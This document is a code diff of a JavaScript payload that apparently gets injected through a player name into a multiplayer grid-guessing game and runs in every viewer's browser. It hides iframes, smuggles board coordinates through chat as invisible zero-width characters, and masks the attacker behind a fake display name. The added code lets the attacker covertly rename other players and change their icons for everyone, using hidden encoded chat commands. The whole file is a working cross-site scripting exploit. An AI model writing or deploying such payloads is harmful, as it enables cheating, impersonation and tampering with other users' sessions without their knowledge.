@@ -1,19 +1,19 @@
-// Runs in every browser that renders the exploit guest's name, including late joiners.
-// Coordinates are sent in chat as invisible characters, hidden from the chat box,
-// and logged once. The guest is shown as a normal name, and the iframe is removed
-// from the player list, results, and round history.
 (function () {
   if (window.__gridCordDemo) return;
   window.__gridCordDemo = true;
 
-  const DISPLAY_NAME = 'Alex';
+  const DISPLAY_NAME = 'Ghios';
   const MARK = '\u2060';
   const ZERO = '\u200c';
   const ONE = '\u200d';
   const BREAK = '\u200b';
   const LETTERS = 'ABCDEFGHIJKLMNOP';
   const seen = Object.create(null);
+  const overrides = Object.create(null);
+  const serverNames = Object.create(null);
+  const serverIcons = Object.create(null);
   let sweeping = false;
+  let refreshQueued = false;
 
   const style = document.createElement('style');
   style.textContent = 'iframe{display:none!important}';
@@ -79,30 +79,198 @@
     console.log(formatRecord(raw));
   }
 
+  function playerFromIndex(index) {
+    const n = typeof index === 'number' ? index : parseInt(index, 10);
+    if (!isFinite(n) || n < 1 || n > 10 || Math.floor(n) !== n) {
+      console.warn('Use a player index from 1 to 10');
+      return null;
+    }
+    const player = gameState && gameState.players && gameState.players[n - 1];
+    if (!player) {
+      console.warn('No player at index ' + n);
+      return null;
+    }
+    return player;
+  }
+
+  function setOverride(id, field, value) {
+    if (!id) return false;
+    const current = overrides[id] || {};
+    if (current[field] === value) return false;
+    current[field] = value;
+    overrides[id] = current;
+    return true;
+  }
+
+  function applyCommand(text) {
+    const kind = text.slice(0, 2);
+    const rest = text.slice(3);
+    if (kind === '!c') return clearOverride(rest);
+    const space = rest.indexOf(' ');
+    if (space < 1) return false;
+    const id = rest.slice(0, space);
+    const value = rest.slice(space + 1);
+    if (kind === '!n') return setOverride(id, 'name', value);
+    if (kind === '!i') return setOverride(id, 'icon', value);
+    return false;
+  }
+
   function reveal(message) {
     const text = decode(message);
-    if (text === null) return false;
+    if (text === null) return { hidden: false, changed: false };
+    if (text.charAt(0) === '!') return { hidden: true, changed: applyCommand(text) };
     logOnce(text);
+    return { hidden: true, changed: false };
+  }
+
+  function queueRefresh() {
+    if (refreshQueued) return;
+    refreshQueued = true;
+    requestAnimationFrame(function () {
+      refreshQueued = false;
+      if (typeof updateGameDisplay === 'function' && gameState) updateGameDisplay();
+    });
+  }
+
+  function noteServerIdentity(player) {
+    const over = overrides[player.id];
+    const shown = isPayload(player.name) ? DISPLAY_NAME : player.name;
+    if (!(over && over.name != null && shown === over.name)) serverNames[player.id] = shown;
+    if (!(over && over.icon != null && player.icon === over.icon)) serverIcons[player.id] = player.icon;
+  }
+
+  function restorePlayer(id) {
+    if (!gameState) return;
+    (gameState.players || []).forEach(function (player) {
+      if (player.id !== id) return;
+      if (serverNames[id] != null) player.name = serverNames[id];
+      if (serverIcons[id] != null) player.icon = serverIcons[id];
+    });
+    (gameState.leaderboard || []).forEach(function (player) {
+      if (player.id !== id) return;
+      if (serverNames[id] != null) player.name = serverNames[id];
+      if (serverIcons[id] != null) player.icon = serverIcons[id];
+    });
+    (gameState.round_history || []).forEach(function (round) {
+      if (round.cluegiver_id !== id) return;
+      if (serverNames[id] != null) round.cluegiver_name = serverNames[id];
+      if (serverIcons[id] != null) round.cluegiver_icon = serverIcons[id];
+    });
+    ['first_guesses', 'second_guesses'].forEach(function (key) {
+      (gameState[key] || []).forEach(function (entry) {
+        if (entry.player_id !== id) return;
+        if (serverNames[id] != null) entry.player_name = serverNames[id];
+        if (serverIcons[id] != null) entry.player_icon = serverIcons[id];
+      });
+    });
+  }
+
+  function clearOverride(id) {
+    if (!overrides[id]) return false;
+    delete overrides[id];
+    restorePlayer(id);
     return true;
+  }
+
+  function maskSender(data) {
+    if (!data) return;
+    if (isPayload(data.player_name)) data.player_name = DISPLAY_NAME;
+    Object.keys(serverNames).forEach(function (id) {
+      const over = overrides[id];
+      if (over && over.name != null && data.player_name === serverNames[id]) data.player_name = over.name;
+    });
   }
 
   function maskState(state) {
     if (!state) return;
+    const renamed = Object.create(null);
     (state.players || []).forEach(function (player) {
       if (isPayload(player.name)) player.name = DISPLAY_NAME;
+      noteServerIdentity(player);
+      const over = overrides[player.id];
+      if (!over) return;
+      if (over.name != null) {
+        renamed[serverNames[player.id]] = over.name;
+        player.name = over.name;
+      }
+      if (over.icon != null) player.icon = over.icon;
     });
     (state.round_history || []).forEach(function (round) {
       if (isPayload(round.cluegiver_name)) round.cluegiver_name = DISPLAY_NAME;
+      const over = overrides[round.cluegiver_id];
+      if (!over) return;
+      if (over.name != null) round.cluegiver_name = over.name;
+      if (over.icon != null) round.cluegiver_icon = over.icon;
     });
     (state.leaderboard || []).forEach(function (player) {
       if (isPayload(player.name)) player.name = DISPLAY_NAME;
+      const over = player.id && overrides[player.id];
+      if (!over) return;
+      if (over.name != null) player.name = over.name;
+      if (over.icon != null) player.icon = over.icon;
     });
-    ['first_guesses', 'second_guesses', 'chat_messages'].forEach(function (key) {
+    ['first_guesses', 'second_guesses'].forEach(function (key) {
       (state[key] || []).forEach(function (entry) {
         if (isPayload(entry.player_name)) entry.player_name = DISPLAY_NAME;
+        const over = overrides[entry.player_id];
+        if (!over) return;
+        if (over.name != null) entry.player_name = over.name;
+        if (over.icon != null) entry.player_icon = over.icon;
       });
     });
+    (state.chat_messages || []).forEach(function (entry) {
+      if (isPayload(entry.player_name)) entry.player_name = DISPLAY_NAME;
+      if (renamed[entry.player_name]) entry.player_name = renamed[entry.player_name];
+    });
   }
+
+  function showChange() {
+    maskState(gameState);
+    if (typeof updateGameDisplay === 'function' && gameState) updateGameDisplay();
+  }
+
+  function publishCommand(text) {
+    if (typeof socket === 'undefined' || !currentRoom) return;
+    socket.emit('send_message', {
+      room_code: currentRoom,
+      message: encode(text)
+    });
+  }
+
+  window.setPlayerName = function (index, name) {
+    const player = playerFromIndex(index);
+    if (!player) return;
+    if (typeof name !== 'string' || !name) {
+      console.warn('Pass a name string');
+      return;
+    }
+    setOverride(player.id, 'name', name);
+    showChange();
+    publishCommand('!n ' + player.id + ' ' + name);
+    console.log('Player ' + index + ' name -> ' + name);
+  };
+
+  window.setPlayerIcon = function (index, icon) {
+    const player = playerFromIndex(index);
+    if (!player) return;
+    if (typeof icon !== 'string' || !icon) {
+      console.warn('Pass an icon string');
+      return;
+    }
+    setOverride(player.id, 'icon', icon);
+    showChange();
+    publishCommand('!i ' + player.id + ' ' + icon);
+    console.log('Player ' + index + ' icon -> ' + icon);
+  };
+
+  window.resetPlayer = function (index) {
+    const player = playerFromIndex(index);
+    if (!player) return;
+    clearOverride(player.id);
+    showChange();
+    publishCommand('!c ' + player.id);
+    console.log('Player ' + index + ' reset');
+  };
 
   function publish(kind, position) {
     if (typeof socket === 'undefined' || !currentRoom) return;
@@ -130,12 +298,17 @@
       });
 
       const chat = document.getElementById('chatMessages');
+      let changed = false;
       if (chat) {
         chat.querySelectorAll('.chat-message').forEach(function (row) {
           const body = row.querySelector('.chat-message-text');
-          if (body && reveal(body.textContent)) row.remove();
+          if (!body) return;
+          const result = reveal(body.textContent);
+          if (result.hidden) row.remove();
+          if (result.changed) changed = true;
         });
       }
+      if (changed) queueRefresh();
     } finally {
       sweeping = false;
     }
@@ -165,8 +338,14 @@
 
   const originalAdd = addChatMessage;
   addChatMessage = function (data) {
-    if (data && reveal(data.message)) return;
-    if (data && isPayload(data.player_name)) data.player_name = DISPLAY_NAME;
+    if (data) {
+      const result = reveal(data.message);
+      if (result.hidden) {
+        if (result.changed) queueRefresh();
+        return;
+      }
+    }
+    maskSender(data);
     return originalAdd(data);
   };
 
@@ -178,12 +357,16 @@
       return;
     }
     const saved = gameState.chat_messages;
+    let changed = false;
     gameState.chat_messages = saved.filter(function (msg) {
-      return !reveal(msg.message);
+      const result = reveal(msg.message);
+      if (result.changed) changed = true;
+      return !result.hidden;
     });
     originalLoad();
     gameState.chat_messages = saved;
     scheduleSweep();
+    if (changed) queueRefresh();
   };
 
   if (typeof updateGameDisplay === 'function') {
@@ -199,13 +382,17 @@
   if (typeof socket !== 'undefined' && socket.off) {
     socket.off('new_message');
     socket.on('new_message', function (data) {
-      if (data && reveal(data.message)) {
-        quietBadge();
-        return;
+      if (data) {
+        const result = reveal(data.message);
+        if (result.hidden) {
+          quietBadge();
+          if (result.changed) showChange();
+          return;
+        }
       }
       const currentPlayer = gameState ? gameState.players.find(function (p) { return p.id === currentPlayerId; }) : null;
-      const isOwnMessage = currentPlayer && data.player_name === currentPlayer.name;
-      if (data && isPayload(data.player_name)) data.player_name = DISPLAY_NAME;
+      const isOwnMessage = currentPlayer && data && (data.player_name === currentPlayer.name || data.player_name === serverNames[currentPlayer.id]);
+      maskSender(data);
       addChatMessage(data);
       if (!chatIsOpen && !isOwnMessage) {
         unreadMessageCount++;
@@ -235,6 +422,9 @@
   });
   observer.observe(document.body, { childList: true, subtree: true, characterData: true });
 
+  if (gameState && gameState.chat_messages) {
+    gameState.chat_messages.forEach(function (msg) { reveal(msg.message); });
+  }
   maskState(gameState);
   if (typeof updateGameDisplay === 'function' && gameState) updateGameDisplay();
   sweep(document.body);
